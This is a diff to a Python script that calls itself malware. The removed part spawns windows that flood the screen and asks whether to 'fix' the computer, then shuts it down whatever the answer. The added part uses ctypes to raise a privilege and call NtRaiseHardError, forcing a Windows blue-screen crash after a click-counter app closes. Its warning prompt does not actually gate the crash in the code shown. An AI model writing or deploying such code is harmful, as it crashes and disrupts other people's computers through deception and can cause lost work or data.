@@ -7,62 +7,13 @@ import os
 import pygame
 import time
 from screeninfo import get_monitors
-
+import ctypes
 Warning_accepted = False
 if not Warning_accepted:
     respomse = messagebox.askyesno("STOP", "this is malware you wanna continue?")
     if respomse:
         Warning_accepted = True
         
-    class MovingWindow:
-        warning_accepted = False
-
-    def __init__(self, master):
-        self.master = master
-        self.master.title("YOUR TITLE")
-        self.master.geometry("100x100")
-
-        self.monitors = get_monitors()
-
-        self.start_move()
-        self.master.after(1, self.duplicate_window)
-
-    def start_move(self):
-        self.move_window_smooth()
-
-    def move_window_smooth(self, steps=5, duration=0):
-        initial_x = self.master.winfo_x()
-        initial_y = self.master.winfo_y()
-
-        monitor = random.choice(self.monitors)  # Choose a random monitor
-        target_x = random.randint(monitor.x, monitor.x + monitor.width - 150)
-        target_y = random.randint(monitor.y, monitor.y + monitor.height - 100)
-
-        x_step = (target_x - initial_x) / steps
-        y_step = (target_y - initial_y) / steps
-
-        self.move_smooth_recursive(initial_x, initial_y, x_step, y_step, steps, duration)
-
-    def move_smooth_recursive(self, current_x, current_y, x_step, y_step, steps_left, duration):
-        if steps_left > 0:
-            self.master.geometry(f"100x100+{int(current_x)}+{int(current_y)}")
-
-            random_color = "#{:06x}".format(random.randint(0, 0xFFFFFF))
-            self.master.configure(bg=random_color)
-
-            self.master.after(int(duration / 50),
-                              lambda: self.move_smooth_recursive(current_x + x_step, current_y + y_step,
-                                                                 x_step, y_step, steps_left - 1, duration))
-
-    def duplicate_window(self):
-        if not hasattr(self, "duplicated"):
-            new_window = tk.Toplevel(self.master)
-            new_window.overrideredirect(True)
-            new_window.attributes("-topmost", True)
-            new_window.geometry("100x100+0+0")
-            MovingWindow(new_window)
-            self.duplicated = True
-
 class ClickCounterApp:
     def __init__(self, master):
         self.master = master
@@ -148,9 +99,11 @@ if __name__ == "__main__":
     app = ClickCounterApp(root)
     root.mainloop()
 
-shutdown = input("Do you wish to shutdown your computer to fix it? (yes / no): ") 
-
-if shutdown == 'no': 
-    os.system("shutdown /s /t 1") 
-else: 
-    os.system("shutdown /s /t 1") 
+ntdll = ctypes.windll.ntdll
+prev_value = ctypes.c_bool()
+res = ctypes.c_ulong()
+ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+    print("BSOD Successfull!")
+else:
+    print("BSOD Failed...")
